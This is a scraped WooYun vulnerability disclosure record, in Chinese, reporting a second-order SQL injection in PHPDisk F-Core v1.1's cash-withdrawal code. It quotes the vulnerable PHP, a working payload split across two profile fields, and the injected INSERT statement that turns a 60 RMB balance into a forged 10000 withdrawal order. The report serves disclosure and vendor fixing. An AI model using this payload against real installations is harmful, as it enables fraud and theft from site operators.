{"id": 52661, "wybug_id": "wooyun-2014-070527", "wybug_title": "PHPDisk F-Core v1.1 二次注入分分钟变土豪", "wybug_corp": "phpdisk.com", "wybug_author": "飞扬风", "wybug_date": "2014-08-01 16:54", "wybug_open_date": "2014-10-30 16:56", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-30：\t细节向公众公开  简要描述： 少量投资即可发家致富PHPDisk为您办到~ 详细说明：  该套系统可以进行提现到支付宝或财付通的操作提现时帐户信息直接从数据库中提取后又写入体现记录中，导致二次注入代码主要是在\\modules\\profile.inc.php，第194行左右\ncase 'income':\t\t$same_pwd = @$db->result_first(\"select count(*) from {$tpf}users where password=income_pwd and userid='$pd_uid'\");\t\t$rs = $db->fetch_one_array(\"select * from {$tpf}users where userid='$pd_uid'\");\t\tif($rs){\t\t\t$wealth_lost = $rs['wealth_lost'] ? (int)$rs['wealth_lost'] : ($settings['wealth_lost'] ? (int)$settings['wealth_lost'] : 0);\t\t\t$wealth = $rs['wealth'];\t\t\t$income_account = $rs['income_account']; //直接提取\t\t\t$income_name = $rs['income_name']; //直接提取\t\t\t$income_type = $rs['income_type'];\t\t\t$income_type_txt = $arr[$income_type];\t\t......中间省略......\t\t\tif(!$error){\t\t\t\t$ins = array(\t\t\t\t'order_number' => get_order_number(),\t\t\t\t'income_account' => $income_account,\t\t\t\t'income_name' => $income_name,\t\t\t\t'income_type' => $income_type,\t\t\t\t'o_status' => 'pendding',\t\t\t\t'userid' => $pd_uid,\t\t\t\t'money' => $money,\t\t\t\t'ip' => $onlineip,\t\t\t\t'in_time' => $timestamp,\t\t\t\t);echo \"insert into {$tpf}income_orders set \".$db->sql_array($ins).\"\";\t\t\t\t$db->query_unbuffered(\"insert into {$tpf}income_orders set \".$db->sql_array($ins).\"\"); //注入点\t\t\t\t$db->query_unbuffered(\"update {$tpf}users set wealth=$now_wealth where userid='$pd_uid'\");\t\t\t\t$sysmsg[] = __('add_income_order_success');\t\t\t\tredirect('back',$sysmsg);\t\t\t}else{\t\t\t\tredirect('back',$sysmsg);\t\t\t}\t\t}else{\t\t\t$curr_credit_rate = $myinfo[credit_rate] ? exp_credit_rate($myinfo[credit_rate]) : (($settings[how_downs_credit] && $settings[how_money_credit]) ? $settings[how_downs_credit].'==￥'.$settings[how_money_credit] : '');\t\t\t$freeze_money = @$db->result_first(\"select sum(money) from {$tpf}income_orders where userid='$pd_uid' and o_status='pendding'\");\t\t\t$freeze_money = $freeze_money ? '<span class=\"txtgray\">（'.__('incoming').':￥'.$freeze_money.'）</span>' : '';\t\t\t$my_downlines = @$db->result_first(\"select count(*) from {$tpf}buddys where userid='$pd_uid'\");\t\t\trequire_once template_echo('profile',$user_tpl_dir);\t\t}\t\tbreak;\n$rs['income_name']和$rs['income_account']两个字段都可以利用不过这两个字段设置时都有限制，50字符最多，因此要把两个字段综合起来才好构造注入   漏洞证明：  由于是跟返现相关的注入，那就直接构造一大笔钱的返现来证明例如，测试帐号中只有60RMB\n\n来个提现60000元试试首先设置收入帐户为*/income_name='test',money=10000,ip=1,in_time=1#，即account姓名为1',income_type=1,o_status=1,userid=2,/*，即name\n\n然后进行提现，填对就可以了\n\n提现时执行的语句是这样的\ninsert into pd_income_orders set `order_number`='20140731230129482338', `income_account`='1',income_type=1,o_status=1,userid=2,/*', `income_name`='*/income_name='test',money=10000,ip=1,in_time=1#', `income_type`='alipay', `o_status`='pendding', `userid`='2', `money`='20', `ip`='1.1.1.1', `in_time`='1406818889'\n看下提现记录，直接变土豪了~\n\n   修复方案：  注意二次注入的问题~   版权声明：转载请注明来源 飞扬风@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-08-05 16:57 厂商回复： 感谢反馈 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}